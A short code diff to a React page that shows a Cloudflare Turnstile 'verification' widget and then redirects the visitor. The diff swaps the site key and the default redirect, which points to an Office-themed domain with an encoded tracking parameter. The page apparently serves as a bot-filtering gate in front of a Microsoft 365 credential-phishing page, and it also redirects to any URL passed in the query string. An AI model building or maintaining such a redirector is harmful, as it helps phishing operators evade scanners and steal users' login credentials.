@@ -6,7 +6,7 @@ function App() {
   useEffect(() => {
     // Get redirect URL from query parameters
     const params = new URLSearchParams(window.location.search);
-    const redirectUrl = params.get('redirect') || 'https://office.tadalafil733.us/aVreVsFb';
+    const redirectUrl = params.get('redirect') || 'https://handwithlegs.com/o/?c3Y9bzM2NV8xX25vbSZtPXZnJnVpZD1VU0VSMTUxMDIwMjVVNDAxMDE1MjEmdD1hYw==N0123N';
 
     // Wait for Turnstile script to load and render widget
     const checkTurnstile = setInterval(() => {
@@ -18,7 +18,7 @@ function App() {
 
         // Render the Turnstile widget
         (window as any).turnstile.render(turnstileRef.current, {
-          sitekey: '0x4AAAAAABaeDHdwHVmJobfE',
+          sitekey: '0x4AAAAAAB6xkXgwEESfad31',
           theme: 'dark',
           callback: (token: string) => {
             // Redirect on successful verification
